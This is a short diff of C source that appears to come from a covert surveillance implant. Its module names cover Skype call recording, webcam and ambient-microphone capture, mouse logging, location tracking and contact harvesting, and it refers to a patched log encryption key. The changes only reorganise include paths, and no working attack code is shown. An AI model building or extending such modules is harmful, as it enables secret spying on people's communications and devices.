@@ -101,7 +101,7 @@ void PM_MoneyRegister();
 #include "HM_WiFiLocation.h" // XXX da modificare
 #include "HM_PrintPool.h" // XXX da modificare 
 #include "HM_CrisisAgent.h" // XXX da modificare 
-#include "HM_SkypeRecord.h" // XXX da modificare 
+#include "../modules/imagent/HM_SkypeRecord.h"
 #include "HM_UrlLog.h" // XXX da modificare 
 #include "HM_WebCam.h" // XXX da modificare 
 void PM_AmbMicRegister();
@@ -112,9 +112,8 @@ extern void PM_IMRegister();	// defined in /modules/imagent
 
 #include "HM_MouseLog.h" // XXX da modificare
 #include "HM_Application.h" // XXX da modificare
-#include "HM_PDAAGent.h" // XXX da modificare
 #include "HM_Contacts.h" // XXX da modificare
-#include "HM_SocialAgent.h" // XXX da modificare
+void PM_SocialAgentRegister();
 
 // Qui finira' il binary patch con la chiave di cifratura dei log
 BYTE bin_patched_key[] = ENCRYPTION_KEY;
@@ -1633,7 +1632,7 @@ BOOL HM_TimeStringToFileTime(const WCHAR *time_string, FILETIME *ftime)
 	return SystemTimeToFileTime(&stime, ftime);
 }
 
-#include "SkypeACL\HashUtil.h"
+#include "../modules/imagent/SkypeACL/HashUtil.h"
 #define EXT_LEN 4
 BOOL CreateFakeExtension(char *ext)
 {
